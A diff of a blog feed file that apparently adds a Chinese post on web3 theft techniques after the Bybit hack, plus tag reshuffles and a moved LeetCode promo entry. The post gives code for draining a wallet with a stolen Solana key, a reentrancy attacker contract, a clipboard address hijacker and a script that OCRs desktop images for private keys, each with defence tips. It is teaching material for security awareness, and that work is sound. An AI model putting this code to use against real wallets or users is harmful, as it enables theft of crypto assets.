+        <content type="html"><![CDATA[<p>近期 Bybit的多签冷钱包被黑，损失约14.6亿美元，导致用户资产被盗，这事闹得沸沸扬扬，这次的事件给 web3 社区带来了很多的思考。经调查，Safe 官方声明指出，北韩骇客组织 Lazarus Group 透过入侵一名 Safe 开发者的设备，将恶意程式码注入前端网站「app.safe.global」，成功绕过多重签名验证，并伪装成正常交易提交批准。Verichains 调查报告显示，该恶意程式码具有针对性，只有在特定条件下 (如操作 Bybit 帐户时) 才会触发，以避免影响普通用户，达到掩人耳目的效果。Safe 团队强调，经外部安全研究人员一致确认，<strong>Safe 的智能合约本身并无漏洞，问题完全出在开发者设备遭入侵。</strong></p><p>这事情挺离谱的，为啥一个开发者就可以不经过 review 直接将明显有问题的代码发布到线上，多签具体是如何绕过的等等。退一步来说，我们就算姑且认可这个结论。但是本次攻击暴露了多签钱包的技术性弱点、以及供应链攻击的致命风险，更让 Safe 作为业界主流安全解决方案的可靠性遭受质疑。此事件揭示了供应链攻击对加密货币生态的威胁，即便智能合约安全，前端与批准环节仍是弱点（这我在之前的区块链钱包中有提到过）。</p><p>今天我们就来聊一聊 web3 黑客攻击的一些常见手段。我会以教育和安全意识提升为目的，从理论和技术的角度探讨区块链黑客可能用来窃取用户资产的常见方法，并提供相应的代码示例。这些方法基于公开已知的攻击方式，主要用于展示漏洞如何被利用，以及如何防范。我不会提供任何实际可直接用于非法行为的代码，而是专注于技术原理的讲解。</p><a id="more"></a><p>在区块链世界中，窃取用户资产的常见手法包括私钥泄露、钓鱼攻击、智能合约漏洞利用和交易篡改等。以下我将以“获取用户私钥”和“利用智能合约漏洞”为例，结合伪代码或简化代码进行说明。</p><h3 id="方法-1：通过钓鱼攻击获取私钥"><a href="#方法-1：通过钓鱼攻击获取私钥" class="headerlink" title="方法 1：通过钓鱼攻击获取私钥"></a>方法 1：通过钓鱼攻击获取私钥</h3><p><strong>原理</strong>：黑客通过伪造网站、恶意软件或社交工程，诱导用户泄露私钥或助记词。一旦获取私钥，黑客可以完全控制用户的钱包并转移资产。</p><p><strong>攻击步骤</strong>：</p><ol><li>创建一个伪装成合法钱包或交易所的钓鱼网站。</li><li>诱导用户输入私钥或助记词（如假装“验证身份”）。</li><li>使用窃取的私钥签名交易，转移资产。</li></ol><p><strong>伪代码示例（基于 Solana）</strong>：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; Keypair, Transaction, SystemProgram, Connection &#125; = <span class="built_in">require</span>(<span class="string">"@solana/web3.js"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设黑客已通过钓鱼网站获取用户私钥</span></span><br><span class="line"><span class="keyword">const</span> stolenPrivateKey = <span class="built_in">Uint8Array</span>.from([<span class="comment">/* 用户私钥字节数组 */</span>]);</span><br><span class="line"><span class="keyword">const</span> hackerWallet = Keypair.fromSecretKey(stolenPrivateKey);</span><br><span class="line"><span class="keyword">const</span> victimPubkey = hackerWallet.publicKey;</span><br><span class="line"><span class="keyword">const</span> hackerPubkey = Keypair.generate().publicKey; <span class="comment">// 黑客自己的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 连接 Solana 网络</span></span><br><span class="line"><span class="keyword">const</span> connection = <span class="keyword">new</span> Connection(<span class="string">"https://api.mainnet-beta.solana.com"</span>, <span class="string">"confirmed"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">stealAssets</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 创建转账交易</span></span><br><span class="line">  <span class="keyword">const</span> transaction = <span class="keyword">new</span> Transaction().add(</span><br><span class="line">    SystemProgram.transfer(&#123;</span><br><span class="line">      fromPubkey: victimPubkey,</span><br><span class="line">      toPubkey: hackerPubkey,</span><br><span class="line">      lamports: <span class="number">1000000000</span>, <span class="comment">// 转移 1 SOL</span></span><br><span class="line">    &#125;)</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 使用窃取的私钥签名交易</span></span><br><span class="line">  <span class="keyword">const</span> signature = <span class="keyword">await</span> connection.sendTransaction(transaction, [hackerWallet]);</span><br><span class="line">  <span class="keyword">await</span> connection.confirmTransaction(signature);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"资产已转移，交易签名:"</span>, signature);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stealAssets().catch(<span class="built_in">console</span>.error);</span><br></pre></td></tr></table></figure></p><p><strong>如何防范</strong>：</p><ul><li>用户应使用硬件钱包（如 Ledger）存储私钥，避免在线输入。</li><li>检查网站 URL 和 SSL 证书，避免访问钓鱼网站。</li><li>使用多重签名钱包，增加资产转移的难度。</li></ul><h3 id="方法-2：利用智能合约漏洞（重入攻击）"><a href="#方法-2：利用智能合约漏洞（重入攻击）" class="headerlink" title="方法 2：利用智能合约漏洞（重入攻击）"></a>方法 2：利用智能合约漏洞（重入攻击）</h3><p><strong>原理</strong>：智能合约可能存在逻辑漏洞，如“重入攻击”（Reentrancy Attack），黑客通过反复调用合约中的函数，在资产提取完成前多次提取资金。常见于以太坊的 Solidity 合约。</p><p><strong>攻击步骤</strong>：</p><ol><li>找到一个未正确实现状态更新的提款合约。</li><li>部署一个恶意合约，反复调用目标合约的提款函数。</li><li>在目标合约更新余额前窃取更多资产。</li></ol><p><strong>代码示例（Solidity）</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">// 目标合约（有漏洞）</span><br><span class="line">contract VulnerableBank &#123;</span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint amount = balances[msg.sender];</span><br><span class="line">        require(amount &gt; 0, &quot;No funds to withdraw&quot;);</span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;); // 外部调用，未更新状态</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">        balances[msg.sender] = 0; // 更新状态滞后</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 恶意合约（攻击者部署）</span><br><span class="line">contract Attacker &#123;</span><br><span class="line">    VulnerableBank public bank;</span><br><span class="line">    uint public attackCount = 0;</span><br><span class="line">    uint constant MAX_ATTEMPTS = 5;</span><br><span class="line"></span><br><span class="line">    constructor(address _bankAddress) &#123;</span><br><span class="line">        bank = VulnerableBank(_bankAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 存款以准备攻击</span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        bank.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 触发重入攻击</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        bank.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 接收资金时反复调用目标合约</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (attackCount &lt; MAX_ATTEMPTS &amp;&amp; address(bank).balance &gt; 0) &#123;</span><br><span class="line">            attackCount++;</span><br><span class="line">            bank.withdraw(); // 重入调用</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>攻击过程</strong>：</p><ol><li>黑客部署 <code>Attacker</code> 合约并向 <code>VulnerableBank</code> 存入少量 ETH。</li><li>调用 <code>attack()</code> 函数，触发 <code>withdraw()</code>。</li><li>在 <code>VulnerableBank</code> 转账给 <code>Attacker</code> 时，<code>receive()</code> 函数被调用，重复执行 <code>withdraw()</code>，直到耗尽合约资金。</li></ol><p><strong>如何防范</strong>：</p><ul><li>在智能合约中，使用“检查-效果-交互”模式（Checks-Effects-Interactions），即先更新状态再执行外部调用。</li><li>使用非重入修饰符（如 OpenZeppelin 的 <code>nonReentrant</code>）。</li><li>定期审计合约代码，避免逻辑漏洞。</li></ul><h3 id="方法-3：交易篡改（中间人攻击）"><a href="#方法-3：交易篡改（中间人攻击）" class="headerlink" title="方法 3：交易篡改（中间人攻击）"></a>方法 3：交易篡改（中间人攻击）</h3><p><strong>原理</strong>：黑客通过恶意软件（如剪贴板劫持）篡改用户复制的接收地址，将资金转到黑客控制的地址。</p><p><strong>伪代码示例</strong>：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 恶意软件伪代码（运行在用户设备上）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">monitorClipboard</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> originalAddress = navigator.clipboard.readText();</span><br><span class="line">  <span class="keyword">if</span> (isValidSolanaAddress(originalAddress)) &#123;</span><br><span class="line">    <span class="keyword">const</span> hackerAddress = <span class="string">"HACKER_ADDRESS_HERE"</span>;</span><br><span class="line">    navigator.clipboard.writeText(hackerAddress);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`地址已替换: <span class="subst">$&#123;originalAddress&#125;</span> -&gt; <span class="subst">$&#123;hackerAddress&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测 Solana 地址的简单校验</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidSolanaAddress</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> address.length === <span class="number">44</span> &amp;&amp; <span class="regexp">/^[A-Za-z0-9]+$/</span>.test(address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 持续监控剪贴板</span></span><br><span class="line">setInterval(monitorClipboard, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure></p><p><strong>如何防范</strong>：</p><ul><li>使用防病毒软件检测恶意程序。</li><li>手动验证交易地址，而不是依赖复制粘贴。</li><li>在发送交易前，使用钱包的地址校验功能。</li></ul><p>除了监控剪贴板，最近我还发现一些恶意钱包会读取用户本地的图片，读取这些图片，利用光学字符识别（OCR）技术提取私钥信息，进而控制用户钱包并转移资产。</p><p>接下来，我们通过代码来讲解。</p><p>第一步：扫描本地图片</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_images</span><span class="params">(directory)</span>:</span></span><br><span class="line">    image_files = []</span><br><span class="line">    <span class="keyword">for</span> root, _, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            <span class="keyword">if</span> file.endswith((<span class="string">".png"</span>, <span class="string">".jpg"</span>, <span class="string">".jpeg"</span>)):</span><br><span class="line">                image_files.append(os.path.join(root, file))</span><br><span class="line">    <span class="keyword">return</span> image_files</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例：扫描桌面</span></span><br><span class="line">desktop_path = os.path.expanduser(<span class="string">"~/Desktop"</span>)</span><br><span class="line">images = scan_images(desktop_path)</span><br><span class="line">print(<span class="string">"找到的图片文件:"</span>, images)</span><br></pre></td></tr></table></figure><p>第二步：提取私钥信息</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract_text_from_image</span><span class="params">(image_path)</span>:</span></span><br><span class="line">    img = Image.open(image_path)</span><br><span class="line">    text = pytesseract.image_to_string(img)</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_private_key</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="comment"># 假设 Solana 私钥是 44 字符的 Base58 字符串</span></span><br><span class="line">    <span class="keyword">import</span> re</span><br><span class="line">    pattern = <span class="string">r"[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]&#123;44&#125;"</span></span><br><span class="line">    match = re.search(pattern, text)</span><br><span class="line">    <span class="keyword">return</span> match.group(<span class="number">0</span>) <span class="keyword">if</span> match <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例：处理找到的图片</span></span><br><span class="line"><span class="keyword">for</span> image <span class="keyword">in</span> images:</span><br><span class="line">    text = extract_text_from_image(image)</span><br><span class="line">    private_key = find_private_key(text)</span><br><span class="line">    <span class="keyword">if</span> private_key:</span><br><span class="line">        print(<span class="string">"找到私钥:"</span>, private_key)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>第三步：转移资产</p><p>这个前面已经讲过了，这里不再赘述。</p><p><strong>如何防范</strong>：</p><ul><li>避免将私钥或助记词截图保存，优先使用硬件钱包（如 Ledger、Trezor）。</li><li>如果必须保存私钥，使用加密工具（如 VeraCrypt）存储文件。</li><li>安装防病毒软件，定期扫描设备。</li><li>避免下载不明来源的文件或点击可疑链接。</li><li>谨慎使用钱包软件，不要安装来源不明的软件。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>以上方法展示了黑客可能利用的技术手段，但这些知识应仅用于学习和防御目的。区块链的安全性依赖于用户的警惕性和开发者的严谨性。作为一名“虚拟黑客”，我强调：任何非法窃取资产的行为都是不道德且违法的。真正的技术爱好者应致力于构建更安全的区块链生态，而不是破坏它。</p><p>如果你是开发者或用户，可以通过以下措施提高安全性：</p><ul><li><strong>用户</strong>：使用冷钱包、避免泄露私钥、验证交易细节。</li><li><strong>开发者</strong>：审计代码、使用成熟库（如 OpenZeppelin）、实施多重签名。</li></ul><p>有其他具体问题吗？我可以进一步深入某个攻击或防御策略！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 区块链 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 区块链 </tag>
+            
+            <tag> web3 </tag>
+            
+            <tag> 黑客 </tag>
             
         </tags>
       
@@ -3868,9 +3868,9 @@
           
           <category> 前端 </category>
           
-          <category> 校招 </category>
-          
           <category> 面经 </category>
+          
+          <category> 校招 </category>
           
           <category> 虾皮 </category>
           
@@ -4908,9 +4908,9 @@
       
         <tags>
             
-            <tag> 滑动窗口 </tag>
-            
             <tag> 前缀和 </tag>
+            
+            <tag> 滑动窗口 </tag>
             
             <tag> LeetCode </tag>
             
@@ -5618,9 +5618,9 @@
           
           <category> 前端 </category>
           
-          <category> 校招 </category>
-          
           <category> 面经 </category>
+          
+          <category> 校招 </category>
           
           <category> 好未来 </category>
           
@@ -5839,6 +5839,37 @@
     
     
     <entry>
+      <title>力扣加加闪亮登场～</title>
+      <link href="/blog/2020/06/13/leetcode-pp/"/>
+      <url>/blog/2020/06/13/leetcode-pp/</url>
+      
+        <content type="html"><![CDATA[<p>力扣加加，一个努力做西湖区最好的算法题解的团队。</p><p><img src="https://p.ipic.vip/befr2w.jpeg" width="50%"></p><p>​<a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">脑洞前端：你已经长大了，是时候自己写题解了。</span><br><span class="line">力扣加加：。。。</span><br></pre></td></tr></table></figure><p>独立的原因是让公众号的定位更加清晰，喜欢我的题解的朋友可以关注力扣加加，喜欢我的前端架构剖析，徒手造框架的朋友可以关注脑洞前端。当然如果你同时关注两个，那我会感动到哭。</p><p>虽然是新的公众号，但是我的初心不变，依然是<code>力求用清晰直白的方式还原解题过程，努力做西湖区最好的算法题解</code>。最后感谢大家一路以来的支持，我一定不负众望，越做越好。</p><h2 id="规划"><a href="#规划" class="headerlink" title="规划"></a>规划</h2><p>预计力扣加加会推出<strong>五个</strong>板块。</p><h3 id="91-算法"><a href="#91-算法" class="headerlink" title="91 算法"></a>91 算法</h3><p><img src="https://p.ipic.vip/av1d3j.jpg" alt></p><p>通过在 91 天的集中训练，帮助大家摆脱困境，征服算法。我们会帮助大家规划学习路线，91 天见证不一样的自己。群里会有专门的资深算法竞赛大佬坐阵解答大家的问题和疑问，并且会对前一天的题目进行讲解。<strong>我会在结束之后将讲义和题解放到公众号号</strong>。</p><p><img src="https://p.ipic.vip/jj4mn2.jpg" alt> （仓库部分内容）</p><h3 id="算法题解"><a href="#算法题解" class="headerlink" title="算法题解"></a>算法题解</h3><p>就是对力扣中的题目进行讲解，尤其是经典的题目。并且尽量从多个角度思路，帮助大家纵向打开解题思路。目前差不多有几百的题解了。</p><p><img src="https://p.ipic.vip/7dma1j.jpg" alt></p><h3 id="专题讲解"><a href="#专题讲解" class="headerlink" title="专题讲解"></a>专题讲解</h3><p>对于共性比较强的，我会抽离成专题形式，帮助大家横向打开解题思路。</p><p><img src="https://p.ipic.vip/9zwe7i.jpg" alt> （之后会陆续加入更多专题）</p><h3 id="视频题解"><a href="#视频题解" class="headerlink" title="视频题解"></a>视频题解</h3><p>对于一些题目采用视频的方式可能更加直观方便，之后还会考虑直播。</p><p><img src="https://p.ipic.vip/jn9fmt.jpg" alt></p><h3 id="刷题工具"><a href="#刷题工具" class="headerlink" title="刷题工具"></a>刷题工具</h3><p>初步规划了两个小工具，之后出测试版本会第一时间告诉大家，如果你对开发小工具感兴趣，也可以点击公众号的联系我来和我取得联系。</p><p><img src="https://p.ipic.vip/8oj6k2.jpg" alt> （力扣加加刷题小助手）</p><h2 id="悬赏令"><a href="#悬赏令" class="headerlink" title="悬赏令"></a>悬赏令</h2><p>大家在日常生活或是在刷题过程中有时一定会产生一些疑问，百度谷歌翻来覆去的找也找不到心中所期待的答案，因此，大家可以通过<strong>力扣加加</strong>来将这些疑问提出来，不定期从大家的问题中挑选出比较经典的几个问题来供大家一起讨论，大致的问题类型如下：</p><ul><li>日常生活中有个问题想用数据结构+算法解决，但苦于思路不清晰</li><li>问题本身比较纠结，网上众说纷纭，找不到明确的答案</li><li>脑洞问题等等</li></ul><p><img src="https://p.ipic.vip/i7d7h3.jpg" alt> （比如这种问题）</p><p>被抽中的问题对应的朋友及问题回答出色的朋友可以获得准备的小礼物哦！</p><p>最后，每周我们会根据公众号后台的阅读量及分享次数最多的小伙伴给予现金奖励奖励哦～。分享最多 <code>1</code> 人 <code>8.88</code> 红包，阅读最多的 <code>1</code> 人 <code>6.66</code> 红包。</p><p>不是第一也没有关系，我们会从分享排名 <code>2-10</code>撒 名的小伙伴中随机抽取<code>2个</code> 8.88 元红包，阅读排名 <code>2-10</code> 名的小伙伴中随机抽取<code>2个</code> 6.88 元红包，</p><blockquote><p>每周日下午，我们会对本周的数据进行统计，并随机抽取幸运的小伙伴，并对中奖结果在力扣加加公众号进行公布，中奖的小伙伴请主动联系我哦。领奖时间截止到每周日的 24:00。</p></blockquote><h2 id="关注我"><a href="#关注我" class="headerlink" title="关注我"></a>关注我</h2><h3 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h3><p>点关注，不迷路。如果再给 ➕ 个星标就更棒啦！</p><blockquote><p>关注加加，星标加加～</p></blockquote><p><img src="https://p.ipic.vip/n8gbxo.jpg" width="100%"></p><h3 id="官网"><a href="#官网" class="headerlink" title="官网"></a>官网</h3><ul><li><a href="http://leetcode-solution.cn/" target="_blank" rel="noopener">力扣加加官网</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 力扣加加 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 数据结构 </tag>
+            
+            <tag> 算法 </tag>
+            
+            <tag> 算法提高班 </tag>
+            
+            <tag> 力扣加加 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>阿里面试题：如何寻找「两个数组」的中位数？</title>
       <link href="/blog/2020/06/13/leetcode-median/"/>
       <url>/blog/2020/06/13/leetcode-median/</url>
@@ -5866,37 +5897,6 @@
             <tag> 中位数 </tag>
             
             <tag> 二分法 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>力扣加加闪亮登场～</title>
-      <link href="/blog/2020/06/13/leetcode-pp/"/>
-      <url>/blog/2020/06/13/leetcode-pp/</url>
-      
-        <content type="html"><![CDATA[<p>力扣加加，一个努力做西湖区最好的算法题解的团队。</p><p><img src="https://p.ipic.vip/befr2w.jpeg" width="50%"></p><p>​<a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">脑洞前端：你已经长大了，是时候自己写题解了。</span><br><span class="line">力扣加加：。。。</span><br></pre></td></tr></table></figure><p>独立的原因是让公众号的定位更加清晰，喜欢我的题解的朋友可以关注力扣加加，喜欢我的前端架构剖析，徒手造框架的朋友可以关注脑洞前端。当然如果你同时关注两个，那我会感动到哭。</p><p>虽然是新的公众号，但是我的初心不变，依然是<code>力求用清晰直白的方式还原解题过程，努力做西湖区最好的算法题解</code>。最后感谢大家一路以来的支持，我一定不负众望，越做越好。</p><h2 id="规划"><a href="#规划" class="headerlink" title="规划"></a>规划</h2><p>预计力扣加加会推出<strong>五个</strong>板块。</p><h3 id="91-算法"><a href="#91-算法" class="headerlink" title="91 算法"></a>91 算法</h3><p><img src="https://p.ipic.vip/av1d3j.jpg" alt></p><p>通过在 91 天的集中训练，帮助大家摆脱困境，征服算法。我们会帮助大家规划学习路线，91 天见证不一样的自己。群里会有专门的资深算法竞赛大佬坐阵解答大家的问题和疑问，并且会对前一天的题目进行讲解。<strong>我会在结束之后将讲义和题解放到公众号号</strong>。</p><p><img src="https://p.ipic.vip/jj4mn2.jpg" alt> （仓库部分内容）</p><h3 id="算法题解"><a href="#算法题解" class="headerlink" title="算法题解"></a>算法题解</h3><p>就是对力扣中的题目进行讲解，尤其是经典的题目。并且尽量从多个角度思路，帮助大家纵向打开解题思路。目前差不多有几百的题解了。</p><p><img src="https://p.ipic.vip/7dma1j.jpg" alt></p><h3 id="专题讲解"><a href="#专题讲解" class="headerlink" title="专题讲解"></a>专题讲解</h3><p>对于共性比较强的，我会抽离成专题形式，帮助大家横向打开解题思路。</p><p><img src="https://p.ipic.vip/9zwe7i.jpg" alt> （之后会陆续加入更多专题）</p><h3 id="视频题解"><a href="#视频题解" class="headerlink" title="视频题解"></a>视频题解</h3><p>对于一些题目采用视频的方式可能更加直观方便，之后还会考虑直播。</p><p><img src="https://p.ipic.vip/jn9fmt.jpg" alt></p><h3 id="刷题工具"><a href="#刷题工具" class="headerlink" title="刷题工具"></a>刷题工具</h3><p>初步规划了两个小工具，之后出测试版本会第一时间告诉大家，如果你对开发小工具感兴趣，也可以点击公众号的联系我来和我取得联系。</p><p><img src="https://p.ipic.vip/8oj6k2.jpg" alt> （力扣加加刷题小助手）</p><h2 id="悬赏令"><a href="#悬赏令" class="headerlink" title="悬赏令"></a>悬赏令</h2><p>大家在日常生活或是在刷题过程中有时一定会产生一些疑问，百度谷歌翻来覆去的找也找不到心中所期待的答案，因此，大家可以通过<strong>力扣加加</strong>来将这些疑问提出来，不定期从大家的问题中挑选出比较经典的几个问题来供大家一起讨论，大致的问题类型如下：</p><ul><li>日常生活中有个问题想用数据结构+算法解决，但苦于思路不清晰</li><li>问题本身比较纠结，网上众说纷纭，找不到明确的答案</li><li>脑洞问题等等</li></ul><p><img src="https://p.ipic.vip/i7d7h3.jpg" alt> （比如这种问题）</p><p>被抽中的问题对应的朋友及问题回答出色的朋友可以获得准备的小礼物哦！</p><p>最后，每周我们会根据公众号后台的阅读量及分享次数最多的小伙伴给予现金奖励奖励哦～。分享最多 <code>1</code> 人 <code>8.88</code> 红包，阅读最多的 <code>1</code> 人 <code>6.66</code> 红包。</p><p>不是第一也没有关系，我们会从分享排名 <code>2-10</code>撒 名的小伙伴中随机抽取<code>2个</code> 8.88 元红包，阅读排名 <code>2-10</code> 名的小伙伴中随机抽取<code>2个</code> 6.88 元红包，</p><blockquote><p>每周日下午，我们会对本周的数据进行统计，并随机抽取幸运的小伙伴，并对中奖结果在力扣加加公众号进行公布，中奖的小伙伴请主动联系我哦。领奖时间截止到每周日的 24:00。</p></blockquote><h2 id="关注我"><a href="#关注我" class="headerlink" title="关注我"></a>关注我</h2><h3 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h3><p>点关注，不迷路。如果再给 ➕ 个星标就更棒啦！</p><blockquote><p>关注加加，星标加加～</p></blockquote><p><img src="https://p.ipic.vip/n8gbxo.jpg" width="100%"></p><h3 id="官网"><a href="#官网" class="headerlink" title="官网"></a>官网</h3><ul><li><a href="http://leetcode-solution.cn/" target="_blank" rel="noopener">力扣加加官网</a></li></ul>]]></content>
-      
-      
-      <categories>
-          
-          <category> 力扣加加 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 数据结构 </tag>
-            
-            <tag> 算法 </tag>
-            
-            <tag> 算法提高班 </tag>
-            
-            <tag> 力扣加加 </tag>
             
         </tags>
       
@@ -6397,9 +6397,9 @@
           
           <category> 前端 </category>
           
-          <category> 校招 </category>
-          
           <category> 面经 </category>
+          
+          <category> 校招 </category>
           
           <category> 百度 </category>
           
